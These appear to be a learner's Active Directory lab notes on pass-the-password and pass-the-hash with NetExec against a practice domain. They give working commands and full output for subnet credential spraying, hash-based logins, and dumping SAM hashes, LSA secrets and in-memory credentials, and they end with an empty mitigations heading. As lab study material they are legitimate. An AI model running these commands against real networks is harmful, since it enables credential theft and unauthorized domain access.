

- PtH
	- nxc passing the hash
	- Grab hashes using hashdump
	- secretsdump also works
	- Use the `--local-auth` tag when using PtH
		- `--sam` to dump out any extra hashes with the `--local-auth`
		- `--shares`
		- `--lsa`
		- `smb -M lsassy`
		- CME/NXC also has a DB we can use called `cmedb` or `nxcdb`
- PtP
	- nxc passing the password
	- (Pwned!) means were local password




# Lab

## Pass the password

`nxc smb 192.168.176.0/24 -u fcastle -p 'Password1'`

```
kali@kali ~> nxc smb 192.168.176.0/24 -u fcastle -p 'Password1'
SMB         192.168.176.1   445    DESKTOP-1G36TVE  [*] Windows 10 / Server 2019 Build 19041 x64 (name:DESKTOP-1G36TVE) (domain:DESKTOP-1G36TVE) (signing:False) (SMBv1:False)
SMB         192.168.176.1   445    DESKTOP-1G36TVE  [-] DESKTOP-1G36TVE\fcastle:Password1 STATUS_LOGON_FAILURE
SMB         192.168.176.129 445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.176.129 445    HYDRA-DC         [+] MARVEL.local\fcastle:Password1 (Pwn3d!)

```

## Pass the hash
`nxc smb 192.168.176.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33`

```
kali@kali ~> nxc smb 192.168.176.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33
SMB         192.168.176.1   445    DESKTOP-1G36TVE  [*] Windows 10 / Server 2019 Build 19041 x64 (name:DESKTOP-1G36TVE) (domain:DESKTOP-1G36TVE) (signing:False) (SMBv1:False)
SMB         192.168.176.1   445    DESKTOP-1G36TVE  [-] DESKTOP-1G36TVE\administrator:920ae267e048417fcfe00f49ecbd4b33 STATUS_LOGON_FAILURE
SMB         192.168.176.129 445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.176.129 445    HYDRA-DC         [+] MARVEL.local\administrator:920ae267e048417fcfe00f49ecbd4b33 (Pwn3d!)

```


### Using extra modules

#### Using the sam module

```
kali@kali ~> nxc smb 192.168.176.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33 --sam
SMB         192.168.176.1   445    DESKTOP-1G36TVE  [*] Windows 10 / Server 2019 Build 19041 x64 (name:DESKTOP-1G36TVE) (domain:DESKTOP-1G36TVE) (signing:False) (SMBv1:False)
SMB         192.168.176.1   445    DESKTOP-1G36TVE  [-] DESKTOP-1G36TVE\administrator:920ae267e048417fcfe00f49ecbd4b33 STATUS_LOGON_FAILURE
SMB         192.168.176.129 445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.176.129 445    HYDRA-DC         [+] MARVEL.local\administrator:920ae267e048417fcfe00f49ecbd4b33 (Pwn3d!)
SMB         192.168.176.129 445    HYDRA-DC         [*] Dumping SAM hashes
SMB         192.168.176.129 445    HYDRA-DC         Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
SMB         192.168.176.129 445    HYDRA-DC         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.176.129 445    HYDRA-DC         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[15:18:40] ERROR    SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.           secretsdump.py:1368
SMB         192.168.176.129 445    HYDRA-DC         [+] Added 3 SAM hashes to the database
```





### lsa module

#### lsa alone

```
kali@kali ~> nxc smb 192.168.176.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33 --lsa
SMB         192.168.176.1   445    DESKTOP-1G36TVE  [*] Windows 10 / Server 2019 Build 19041 x64 (name:DESKTOP-1G36TVE) (domain:DESKTOP-1G36TVE) (signing:False) (SMBv1:False)
SMB         192.168.176.1   445    DESKTOP-1G36TVE  [-] DESKTOP-1G36TVE\administrator:920ae267e048417fcfe00f49ecbd4b33 STATUS_LOGON_FAILURE
SMB         192.168.176.129 445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.176.129 445    HYDRA-DC         [+] MARVEL.local\administrator:920ae267e048417fcfe00f49ecbd4b33 (Pwn3d!)
SMB         192.168.176.129 445    HYDRA-DC         [+] Dumping LSA secrets
SMB         192.168.176.129 445    HYDRA-DC         MARVEL\HYDRA-DC$:aes256-cts-hmac-sha1-96:8db66ea6751e8ccbc51b3753c87c4edbde0ac2da38e6cefd5ab45f1c5bdd89d6
SMB         192.168.176.129 445    HYDRA-DC         MARVEL\HYDRA-DC$:aes128-cts-hmac-sha1-96:87776e3ab777b249fd4d62de913eab53
SMB         192.168.176.129 445    HYDRA-DC         MARVEL\HYDRA-DC$:des-cbc-md5:ab4c2fe5469d6bfe
SMB         192.168.176.129 445    HYDRA-DC         MARVEL\HYDRA-DC$:plain_password_hex:db6cdea234b9f2be5a8762fd2f94330ac69e53ec072a67fa3103ed09fa8f8a0b6264c47c89a92576a1136f5d9014346867d2ad6a1e099b2fdc9a085eba55855b5a446c0559c7a3e9511d3c1ba695142b348221cbc64c85184623dc9b84f0399a430521522e28898518777c948fd04a50b0515d79f4de1914a02d85692b15e3bf5e8f9ba9a84f1626b15e0aed64648ac76327080f5a8c456337dc47a30f5a68446fc1a7cb25b21f8b35b70de3f9585e38dba7b7486cf9c3521bfed1feaba6eae1cd5b0e1fedb0d69e3eb973dbb4d545cecca897eee8817bedd12b2dd56f2750ce7d35855bdeb7fab07a4b4cf2f98d7574
SMB         192.168.176.129 445    HYDRA-DC         MARVEL\HYDRA-DC$:aad3b435b51404eeaad3b435b51404ee:000da82dd9ff3c760716ff02e5a926e5:::
SMB         192.168.176.129 445    HYDRA-DC         dpapi_machinekey:0xe43f7db5fbc8dab54cf67120720d79c8473f8226
dpapi_userkey:0xd9ac3d5a384d7d29c8fa0375fa0e368b779b641f
SMB         192.168.176.129 445    HYDRA-DC         NL$KM:b7c446508b51d7108ca5d4f96e5090f2d33022464f5e54906cd33cca207e90cf2eda5729a4ea7abd5b2a96118f6e55978c440ca9ecada3d8af6e3feeb0b33733
SMB         192.168.176.129 445    HYDRA-DC         [+] Dumped 7 LSA secrets to /home/kali/.nxc/logs/HYDRA-DC_192.168.176.129_2024-04-03_152318.secrets and /home/kali/.nxc/logs/HYDRA-DC_192.168.176.129_2024-04-03_152318.cached

```


#### lsassy

Checking for any secrets stored in memory for anyone whos logged in right now as an example

```
kali@kali ~> nxc smb 192.168.176.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33 -M lsassy
SMB         192.168.176.1   445    DESKTOP-1G36TVE  [*] Windows 10 / Server 2019 Build 19041 x64 (name:DESKTOP-1G36TVE) (domain:DESKTOP-1G36TVE) (signing:False) (SMBv1:False)
SMB         192.168.176.1   445    DESKTOP-1G36TVE  [-] DESKTOP-1G36TVE\administrator:920ae267e048417fcfe00f49ecbd4b33 STATUS_LOGON_FAILURE
SMB         192.168.176.129 445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.176.129 445    HYDRA-DC         [+] MARVEL.local\administrator:920ae267e048417fcfe00f49ecbd4b33 (Pwn3d!)
LSASSY      192.168.176.129 445    HYDRA-DC         MARVEL\Administrator 920ae267e048417fcfe00f49ecbd4b33 <------ NTLM hash for the domain user is crackable
```


### Using database nxcdb
using the database


```
kali@kali ~> nxcdb
nxcdb (default) > help

Documented commands (type help <topic>):
========================================
exit  help  proto  workspace

nxcdb (default) > proto
nxcdb (default) > help proto

proto [smb|mssql|winrm]
    *unimplemented protocols: ftp, rdp, ldap, ssh
Changes nxcdb to the specified protocol

nxcdb (default) > proto smb
nxcdb (default)(smb) > help

Documented commands (type help <topic>):
========================================
clear_database  creds  dpapi  exit  export  groups  help  hosts  shares  wcc

Undocumented commands:
======================
back  import

nxcdb (default)(smb) > hosts

+Hosts---+-----------+-----------------+-----------------+------------------------+--------------------------------------+-------+---------+---------+-----------+------------+
| HostID | Admins    | IP              | Hostname        | Domain                 | OS                                   | SMBv1 | Signing | Spooler | Zerologon | PetitPotam |
+--------+-----------+-----------------+-----------------+------------------------+--------------------------------------+-------+---------+---------+-----------+------------+
| 1      | 0 Cred(s) | 10.10.10.161    | FOREST          | htb.local              | Windows Server 2016 Standard 14393   | True  | True    | None    | None      | None       |
| 2      | 0 Cred(s) | 10.10.11.3      | DC              | office.htb             | Windows Server 2022 Build 20348      | False | True    | None    | None      | None       |
| 3      | 0 Cred(s) | 10.10.11.4      | DC01            | jab.htb                | Windows 10 / Server 2019 Build 17763 | False | True    | None    | None      | None       |
| 4      | 0 Cred(s) | 10.10.197.42    | ANONYMOUS       |                       | Windows 6.1                          | True  | False   | None    | None      | None       |
| 5      | 0 Cred(s) | 10.10.10.3      | LAME            | hackthebox.gr          | Unix                                 | True  | False   | None    | None      | None       |
| 6      | 0 Cred(s) | 10.10.10.175    | SAUNA           | EGOTISTICAL-BANK.LOCAL | Windows 10 / Server 2019 Build 17763 | False | True    | None    | None      | None       |
| 7      | 0 Cred(s) | 192.168.176.130 | PUNISHER        | MARVEL.local           | Windows 10 / Server 2019 Build 19041 | False | False   | None    | None      | None       |
| 8      | 3 Cred(s) | 192.168.176.129 | HYDRA-DC        | MARVEL.local           | Windows Server 2022 Build 20348      | False | True    | None    | None      | None       |
| 9      | 0 Cred(s) | 192.168.176.1   | DESKTOP-1G36TVE | DESKTOP-1G36TVE        | Windows 10 / Server 2019 Build 19041 | False | False   | None    | None      | None       |
+--------+-----------+-----------------+-----------------+------------------------+--------------------------------------+-------+---------+---------+-----------+------------+


nxcdb (default)(smb) > hosts 8

+Host----+-----------------+----------+--------------+---------------------------------+------+-------+---------+---------+-----------+------------+
| HostID | IP              | Hostname | Domain       | OS                              | DC   | SMBv1 | Signing | Spooler | Zerologon | PetitPotam |
+--------+-----------------+----------+--------------+---------------------------------+------+-------+---------+---------+-----------+------------+
| 8      | 192.168.176.129 | HYDRA-DC | MARVEL.local | Windows Server 2022 Build 20348 | None | False | True    | None    | None      | None       |
+--------+-----------------+----------+--------------+---------------------------------+------+-------+---------+---------+-----------+------------+


+Credential(s) with Admin Access----+---------------+----------------------------------+
| CredID | CredType  | Domain       | UserName      | Password                         |
+--------+-----------+--------------+---------------+----------------------------------+
| 9      | plaintext | MARVEL.local | fcastle       | Password1                        |
| 10     | hash      | MARVEL.local | administrator | 920ae267e048417fcfe00f49ecbd4b33 |
| 14     | hash      | MARVEL.local | fcastle       | 64f12cddaa88057e06a81b54e73b949b |
+--------+-----------+--------------+---------------+----------------------------------+

```




# Mitigations